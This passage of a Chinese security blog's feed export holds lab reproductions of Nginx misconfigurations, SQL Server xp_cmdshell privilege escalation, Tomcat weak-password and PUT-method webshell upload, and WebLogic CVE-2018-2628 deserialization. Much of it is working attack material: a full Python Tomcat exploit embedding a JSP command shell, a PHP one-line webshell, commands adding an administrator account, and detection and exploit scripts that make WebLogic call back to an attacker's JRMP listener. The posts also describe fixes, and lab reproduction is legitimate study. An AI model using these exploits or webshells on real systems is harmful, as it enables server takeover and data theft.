所以修复该漏洞，我们需要将配置文件改为： location / { return 302 https://$host$request_uri; } 参考 https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html 目录穿越漏洞漏洞说明Nginx在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。 错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）： location /files { alias /home/; } 漏洞利用访问files目录，构造payload： http://192.168.220.150:8081/files 目录穿越到根目录,构造payload： http://192.168.220.150:8081/files../ 此处留下一个疑问，能不能穿越到其他目录？？？ 漏洞修复将/加在files后： location /files/ { alias /home/; } add_header被覆盖漏洞说明Nginx配置文件子块（server、location、if）中的 add_header ，将会覆盖父块中的 add_header 添加的HTTP头，造成一些安全隐患。 如下列代码，整站（父块中）添加了CSP头： add_header Content-Security-Policy &quot;default-src &#39;self&#39;&quot;; add_header X-Frame-Options DENY; location = /test1 { rewrite ^(.*)$ /xss.html break; } location = /test2 { add_header X-Content-Type-Options nosniff; rewrite ^(.*)$ /xss.html break; } 但/test2的location中又添加了 X-Content-Type-Options 头，导致父块中的 add_header 全部失效 解析漏洞漏洞说明Nginx解析漏洞是由于Nginx中php配置不当而造成的，与Nginx版本无关，但在高版本的php中，由于“security.limit_extensions”的引入，使得该漏洞难以被成功利用。 当用户请求的url后缀为123.jpg/123.php时，location对请求进行选择的时候会使用URI环境变量进行选择，其中传递到后端Fastcgi的关键变量SCRIPT_FILENAME由Nginx生成的$fastcgi_script_name决定。 location ~ \.php$ { fastcgi_index index.php; include fastcgi_params; fastcgi_param REDIRECT_STATUS 200; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; fastcgi_param DOCUMENT_ROOT /var/www/html; fastcgi_pass php:9000; } 而为了较好的支持PATH_INFO的提取，在PHP的配置选项里存在cgi.fix_pathinfo选项，其目的是为了从SCRIPT_FILENAME里取出真正的脚本名。一般情况下cgi.fix_pathinfo的值默认为1，也就是开启，从而引发该漏洞。当Nginx遇到文件路径“123.jpg/123.php”时，由于其后缀为.php文件，所以会被传到上述所示代码中，在查找文件时，若“123.jpg/123.php”不存在，则会去掉最后的“123.php”，然后判断“123.jpg”是否存在，若存在，则把“123.jpg”当做php解析。 漏洞复现docker-compose up -d 靶机IP： 192.168.220.151 这是一个文件上传页面，我们先写一个phpinfo函数，将其保存为test1.jpg，上传该文件，页面响应如下： 抓包更改后，文件被重命名，并上传成功！ 接下来我们去尝试访问该文件，文件打不开 根据文件解析漏洞，我们构造payload格式如下： http://192.168.220.151/uploadfiles/重命名.jpg/.php 或 http://192.168.220.151/uploadfiles/重命名.jpg/重命名.php 这里可以直接上传图片马。 漏洞修复 修改php.ini，设置cgi.fix_pathinfo = 0 在Nginx的配置文件中添加if ( $fastcgi_script_name ~ ..&amp;/.*php ) { return 403; } 前两种方法可能会导致一些伪静态网页或者特殊的路径无法显示。第三种方法将以下代码写在fcgi.conf文件中if ($request_filename ~* (.*).php) { set $php_url $1; } if (!-e $php_url.php) { return 403; } 参考：https://www.cnblogs.com/dami520/archive/2012/08/22/2651113.html]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xp_cmdshell提权]]></title>
    <url>%2F2019%2F07%2F30%2Fxp-cmdshell-ti-quan%2F</url>
    <content type="text"><![CDATA[前言xp_cmdshell是Sql Server中的一个组件，可以用来执行系统命令，在拿到sa口令之后，经常可以通过xp_cmdshell来进行提权。 测试环境： Windows Server 2012 Sql Server 2012 利用过程 查看xp_cmdshell状态 右击实例名，选择“方面” 选择外围应用适配器 可以看到xp_cmdshell是关闭状态 通过sql指令来查看是否存在xp_cmdshell右击实例名，新建查询，执行下面指令： select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39; 返回结果是 1 开启xp_cmdshell 执行下面指令： EXEC sp_configure &#39;xp_cmdshell&#39;,1 RECONFIGURE GO 可以看到报错提示xp_cmdshell不存在也可能是高级选项 前面已经通过命令查询存在xp_cmdshell组件，那只可能是高级选项通过命令开启允许编辑高级选项，命令如下: EXEC sp_configure &#39;show advanced options&#39;, 1 GO RECONFIGURE GO 然后再去开启xp_cmdshell 通过xp_cmdshell执行系统命令 写入一句话木马 exec master..xp_cmdshell &quot;echo ^&lt;?php @eval($_POST[&#39;cmd&#39;]);?^&gt; &gt; C:\\test\\cmd.php&quot; 在这个地方，出了一点问题： ①写入的一句话木马中的两个 ^ 是什么意思？ 有什么作用？②后面的创建文件的路径，如果直接写成 C:\\cmd.php 会提示拒绝访问，但是如果写成 C:\\test\\cmd.php 却可以创建成功。难道是不能写在根目录？还是没有权限？ 创建管理员账户 exec master..xp_cmdshell &#39;net user test 123456 /add&#39; exec master..xp_cmdshell &#39;net localgroup administrators test /add&#39; 恢复 如果xp_cmdshell被删除，可以尝试上传xplog70.dll进行恢复，恢复语句： Exec master.dbo.sp_addextendedproc &#39;xp_cmdshell&#39;,&#39;D:\\xplog70.dll&#39; 关闭xp_cmdshell EXEC sp_configure &#39;xp_cmdshell&#39;, 0 GO RECONFIGURE GO 关闭高级选项类似 EXEC sp_configure &#39;show advanced options&#39;, 0 GO RECONFIGURE GO]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tomcat复现之弱口令&后台getshell]]></title>
    <url>%2F2019%2F07%2F29%2Ftomcat-fu-xian-zhi-ruo-kou-ling-hou-tai-getshell%2F</url>
    <content type="text"><![CDATA[前言Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。 漏洞利用弱口令漏洞地址： http://192.168.220.141:8080/manager/html 输入用户名： tomcat密码： tomcat 进入后台 get shell 制作war包 将木马打包成压缩包文件，修改后缀名为war 上传war包 输入密码，get shell！！！]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tomcat复现之远程代码执行漏洞]]></title>
    <url>%2F2019%2F07%2F29%2Ftomcat-fu-xian%2F</url>
    <content type="text"><![CDATA[前言当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（默认关闭），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。 涉及版本tomcat 7.0.0 - 7.0.81 漏洞分析在 Tomcat 安装目录下的配置文件web.xml中，如果有如下代码，则表示Tomcat已开启 PUT 方法 &lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; 确保readonly参数为true（默认值），即不允许DELETE和PUT操作 &lt;!-- readonly Is this context &quot;read only&quot;, so HTTP --&gt; &lt;!-- commands like PUT and DELETE are --&gt; &lt;!-- rejected? [true] --&gt; 漏洞利用上传webshell Burpsuite抓包GET / HTTP/1.1 Host: 192.168.220.141:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 660 将上面的 GET 方法改为 PUT ，后面写要创建的webshell名，下面传入webshell的内容 有下面几种方法： /xxx.jsp/ PUT /123.jsp/ HTTP/1.1 Host: 192.168.220.141:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 660 ...jsp shell... 这种方法是服务器会把最后的 / 去掉 /xxx.jsp%20 PUT /123.jsp%20 HTTP/1.1 Host: 192.168.220.141:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 660 ...jsp shell... 其中 %20 为url编码，实际是指 (空格) /xxx.jsp::$DATA(没有实现) PUT /123.jsp::$DATA HTTP/1.1 Host: 192.168.220.141:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 660 ...jsp shell... 使用这种方法也可以上传成功，但是却不能被解析，上传的文件名为 123.jsp::$DATA 执行结果： python脚本脚本(基于python2)： #! -*- coding:utf-8 -*- import httplib import sys import time body = &#39;&#39;&#39;&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp +&quot;\\n&quot;);}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%&gt;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;))){out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);}else{out.println(&quot;:-)&quot;);}%&gt;&#39;&#39;&#39; try: conn = httplib.HTTPConnection(sys.argv[1]) conn.request(method=&#39;OPTIONS&#39;, url=&#39;/ffffzz&#39;) headers = dict(conn.getresponse().getheaders()) if &#39;allow&#39; in headers and headers[&#39;allow&#39;].find(&#39;PUT&#39;) &gt; 0 : conn.close() conn = httplib.HTTPConnection(sys.argv[1]) url = &quot;/&quot; + str(int(time.time()))+&#39;.jsp/&#39; #url = &quot;/&quot; + str(int(time.time()))+&#39;.jsp::$DATA&#39; conn.request( method=&#39;PUT&#39;, url= url, body=body) res = conn.getresponse() if res.status == 201 : #print &#39;shell:&#39;, &#39;http://&#39; + sys.argv[1] + url[:-7] print &#39;shell:&#39;, &#39;http://&#39; + sys.argv[1] + url[:-1] elif res.status == 204 : print &#39;file exists&#39; else: print &#39;error&#39; conn.close() else: print &#39;Server not vulnerable&#39; except Exception,e: print &#39;Error:&#39;, e 执行结果： C:\Users\l1395\Desktop&gt;python2 test.py 192.168.220.141:8080 shell: http://192.168.220.141:8080/1564383217.jsp 总结该漏洞利用的前提条件需要手动开启readOnly功能，以支持上传操作，默认配置的情况下是无法成功利用漏洞，从实际测试来看，漏洞危害性并没有那么高。但是如果用户一旦启用了readOnly功能，黑客可利用漏洞成功入侵。 根据业务评估配置conf/webxml文件的readOnly值为Ture或注释参数，禁用PUT方法并重启tomcat服务，临时规避安全风险； 注意： 如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Weblogic复现之Java反序列化]]></title>
    <url>%2F2019%2F07%2F28%2Fweblogic-fu-xian-zhi-java-fan-xu-lie-hua%2F</url>
    <content type="text"><![CDATA[前言weblogic的最后一个漏洞，Java反序列化，以前没学过Java，也没学过Java反序列化。。。。 Java序列化与反序列化Java序列化： 即把Java对象转换为字节序列的过程 Java反序列化： 是指把字节序列恢复为Java对象的过程 目的： 为了让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信，对象持久化存储 相关历史漏洞 CVE-2015-4852Weblogic 直接反序列化是基于Weblogic t3协议引起远程代码执行的反序列化漏洞 CVE-2016-0638Weblogic 直接反序列化基于Weblogic t3协议引起远程代码执行的反序列化漏洞 漏洞实为CVE-2015-4852绕过 拜Oracle一直以来的黑名单修复方式所赐 CVE-2016-3510基于Weblogic t3协议引起远程代码执行的反序列化漏洞 CVE-2017-3248基于Weblogic t3协议引起远程代码执行的反序列化漏洞 属于Weblogic JRMP反序列化 CVE-2018-2628基于Weblogic t3协议引起远程代码执行的反序列化漏洞 属于 Weblogic JRMP反序列化 CVE-2018-2893基于Weblogic t3协议引起远程代码执行的反序列化漏洞 实为CVE-2018-2628绕过 同样拜Oracle一直以来的黑名单修复方式所赐 属于Weblogic JRMP反序列化 涉及版本10.3.6.0 12.1.3.0 12.2.1.2 12.2.1.3 漏洞复现方法一 nmap探测目标信息，是否正在使用T3协议 nmap -n -v -p 7001 192.168.220.141 --script=weblogic-t3-info PORT STATE SERVICE 7001/tcp open afs3-callback |_weblogic-t3-info: T3 protocol in use (WebLogic version: 10.3.6.0) 使用python脚本探测目标是否存在Java反序列化漏洞 探测脚本：(基于python2) # -*- coding: utf-8 -*- # FileName: weblogic_poc.py #先进行T3的握手，成功了就发送第一步的payload，然后发送RequestObject，尝试让weblogic反连自己，然后发送恶意数据，通过回显判定恶意特征串来判定是否存在漏洞 import socket import time import re import sys import json socket.setdefaulttimeout(5) VUL=[&#39;CVE-2018-2628&#39;] PAYLOAD=[&#39;aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078&#39;] VER_SIG=[&#39;\\$Proxy[0-9]+&#39;] def t3handshake(sock,server_addr): sock.connect(server_addr) sock.send(&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;.decode(&#39;hex&#39;)) time.sleep(1) sock.recv(1024) #print &#39;handshake successful&#39; def buildT3RequestObject(sock,port): data1 = &#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39; data2 = &#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;.format(&#39;{:04x}&#39;.format(dport)) data3 = &#39;1a7727000d3234322e323134&#39; data4 = &#39;2e312e32353461863d1d0000000078&#39; for d in [data1,data2,data3,data4]: sock.send(d.decode(&#39;hex&#39;)) time.sleep(2) #print &#39;send request payload successful,recv length:%d&#39;%(len(sock.recv(2048))) def sendEvilObjData(sock,data): payload=&#39;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#39; payload+=data payload+=&#39;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#39; payload = &#39;%s%s&#39;%(&#39;{:08x}&#39;.format(len(payload)/2 + 4),payload) sock.send(payload.decode(&#39;hex&#39;)) time.sleep(2) sock.send(payload.decode(&#39;hex&#39;)) res = &#39;&#39; count = 1024 try: while True: res += sock.recv(4096) time.sleep(0.1) count -= 1 if count &lt;= 0: break except Exception as e: pass return res def checkVul(res,server_addr,index): p=re.findall(VER_SIG[index], res, re.S) if len(p)&gt;0: #print &#39;%s:%d is vul %s&#39;%(server_addr[0],server_addr[1],VUL[index]) return True return False def do_run(dip,dport,index): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整 sock.settimeout(25) server_addr = (dip, dport) t3handshake(sock, server_addr) buildT3RequestObject(sock, dport) rs=sendEvilObjData(sock, PAYLOAD[index]) #print &#39;rs&#39;,rs return checkVul(rs, server_addr, index) def run(url, port): try: res = do_run(url, port, 0) if res: out = { &#39;结果&#39;: &#39;存在WebLogic CVE-2018-2628 反序列化RCE漏洞&#39;, &#39;url&#39;: &#39;%s:%s&#39; % (url, port), } return json.dumps(out, encoding=&#39;utf8&#39;, ensure_ascii = False) return False except Exception ,e: print &quot;[!] &quot;, e return False if __name__==&quot;__main__&quot;: dip = sys.argv[1] dport = 7001 print run(dip,dport) 执行结果： root@kali:~# python weblogic_poc.py 192.168.220.141 {&quot;url&quot;: &quot;192.168.220.141:7001&quot;, &quot;结果&quot;: &quot;存在WebLogic CVE-2018-2628 反序列化RCE漏洞&quot;} root@kali:~# 根据前面探测的信息，发现目标存在Java反序列化漏洞 我们需要使用“ysoserial”这个工具: https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 首先使用ysoserial在攻击机上启动一个JRMP server，输入一下命令 java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command] [listen port]: 攻击机要监听的端口 [command]: 想要执行的命令 java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 7089 CommonsCollections1 &quot;touch /tmp/test.bat&quot; 使用python脚本向目标发送数据包，该脚本会让靶机调用相关服务来访问我们启动的JRMP server，执行我们想要的命令 脚本：(基于python2) # -*- coding: utf-8 -*- from __future__ import print_function import binascii import os import socket import sys import time def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client): #generates ysoserial payload command = &#39;java -jar {} {} {}:{} &gt; payload.out&#39;.format(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port) print(&quot;command: &quot; + command) os.system(command) bin_file = open(&#39;payload.out&#39;,&#39;rb&#39;).read() return binascii.hexlify(bin_file) def t3_handshake(sock, server_addr): sock.connect(server_addr) sock.send(&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;.decode(&#39;hex&#39;)) time.sleep(1) sock.recv(1024) print(&#39;handshake successful&#39;) def build_t3_request_object(sock, port): data1 = &#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39; data2 = &#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;.format(&#39;{:04x}&#39;.format(dport)) data3 = &#39;1a7727000d3234322e323134&#39; data4 = &#39;2e312e32353461863d1d0000000078&#39; for d in [data1,data2,data3,data4]: sock.send(d.decode(&#39;hex&#39;)) time.sleep(2) print(&#39;send request payload successful,recv length:%d&#39;%(len(sock.recv(2048)))) def send_payload_objdata(sock, data): payload=&#39;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#39; payload+=data payload+=&#39;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#39; payload = &#39;%s%s&#39;%(&#39;{:08x}&#39;.format(len(payload)/2 + 4),payload) sock.send(payload.decode(&#39;hex&#39;)) time.sleep(2) sock.send(payload.decode(&#39;hex&#39;)) res = &#39;&#39; try: while True: res += sock.recv(4096) time.sleep(0.1) except Exception: pass return res def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(65) server_addr = (dip, dport) t3_handshake(sock, server_addr) build_t3_request_object(sock, dport) payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client) print(&quot;payload: &quot; + payload) rs=send_payload_objdata(sock, payload) print(&#39;response: &#39; + rs) print(&#39;exploit completed!&#39;) if __name__==&quot;__main__&quot;: #check for args, print usage if incorrect if len(sys.argv) != 7: print(&#39;\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] &#39; &#39;[JRMPListener ip] [JRMPListener port] [JRMPClient]\n&#39;) sys.exit() dip = sys.argv[1] dport = int(sys.argv[2]) path_ysoserial = sys.argv[3] jrmp_listener_ip = sys.argv[4] jrmp_listener_port = sys.argv[5] jrmp_client = sys.argv[6] exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client) python 44553.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient] [victim ip]：目标weblogic的IP [victim port]：目标weblogic的端口 [path to ysoserial] ：ysoserial的路径 [JRMPListener ip] ：第一步中启动JRMP Server的IP地址 [JRMPListener port] ：第一步中启动JRMP Server的I端口地址 [JRMPClient]：执行JRMPClient的类，可选的值是JRMPClient或JRMPClient2 等待一小会时间，双方会进行握手，进行数据交互，然后成功执行命令 python2 44553.py 192.168.220.141 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.31.223 7089 JRMPClient handshake successful send request payload successful,recv length:1691 command: java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar JRMPClient 192.168.31.223:7089 &gt; payload.out payload: aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3139322e3136382e33312e32323300001bb1000000007f55ff7000000000000000000000000000000078 进入环境中，查看是否执行成功 docker ps 